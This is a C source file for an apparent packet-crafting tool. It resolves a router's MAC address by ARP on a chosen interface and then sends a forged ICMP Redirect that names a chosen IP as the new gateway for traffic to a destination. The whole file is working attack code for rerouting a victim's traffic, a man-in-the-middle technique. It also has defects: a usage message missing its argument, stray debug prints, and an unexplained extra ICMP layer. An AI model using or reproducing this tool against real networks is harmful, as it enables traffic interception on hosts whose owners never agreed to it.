#include <stdio.h>
#include "datalink.h"
#include "xlayer.h"
#include <stdlib.h>

void 
usage(const char *pgmname)
{ 
 fprintf(stderr,"usage: %s <src ip> <dst ip> <route ip>\n");
 exit(0);
}
void
ICMPRedirect(struct MAC *srcmac,struct MAC *dstmac,uint32_t mip,uint32_t dip);
int
main(int argc, char **argv)
{
	struct layer *head;
	struct MAC m,rt;
	uint32_t mip,dip,rip;
	if(argc<4) usage(*argv);

	if(if_menu(&m) < 0 )
		exit(1);	
	filterDatalink("icmp");
	str_to_ip(argv[1],&mip);	
	str_to_ip(argv[2],&dip);
	str_to_ip(argv[3],&rip);

	ARPRequest(&m,&rt,mip,rip,5);
	ICMPRedirect(&m,&rt,mip,dip);
	exit(0);
}
void
ICMPRedirect(struct MAC *srcmac,struct MAC *dstmac,uint32_t mip,uint32_t dip)
{
	struct layer *head;
	long t1=0,t2=0;

	int d;

	head = alloclayer(LT_ETHER);

	ether_set(head->proto , srcmac ,dstmac, ETHERTYPE_IP);
	
	head->next = alloclayer(LT_IP);

	ip_set(head->next->proto,
			0,sizeof(struct ip)+sizeof(struct icmp)+8,rand()%255,0,
			64,IPPROTO_ICMP,0,mip,dip);
	
	ip_sum(head->next);
	
	head->next->next = alloclayer(LT_ICMP);
	
	icmp_set(head->next->next->proto,ICMP_REDIRECT,ICMP_REDIRECT_NET,htonl(mip),0);

	printf("o");
	ip_set(&((xicmp)head->next->next->proto)->icmp_ip,
			0,sizeof(struct ip)+8,rand()%255,0,
			64,IPPROTO_ICMP,0,mip,dip);
	printf("\nk");
    ((xicmp)head->next->next->proto)->icmp_ip.ip_sum = checksum((unsigned short*)&((xicmp)head->next->next->proto)->icmp_ip,sizeof(struct ip));
	printf("ok");
	head->next->next->next = alloclayer(LT_ICMP);

	icmp_set(head->next->next->next->proto,ICMP_ROUTERSOLICIT,0,htonl(mip),0);

	icmp_sum(head->next->next->next);

	icmp_sum(head->next->next);

	sendlayers(head);
	printlayers(head);
	rmlayers(head);
}	

int
if_menu(struct MAC *m){
	struct datalink *pdl;
	int nif,i,j;
	char buf[100];
	if( (pdl = get_if_list(&nif) ) == NULL){
		fprintf(stderr,"Error getting interface list\n");
		return -1;
	}
	
	for(i=0;i<nif;i++){
		printf("%d: %s\n",i+1,pdl[i].dl_name);
	}
	j = i;
	do{
	 printf("Please choose interface (1-%d):\n",j);
	 fgets(buf,sizeof(buf),stdin);
	 sscanf(buf,"%d",&i);
	}while(i<1 || i>nif);

	if(openDatalink(pdl[i-1].dl_name) == -1){
		fprintf(stderr,"Error opening interface %s\n",pdl[i-1].dl_name);
		return -1;
	}
	if(m != NULL)
		memcpy(m,pdl[i-1].dl_mac,6);
	return 0;
}


		



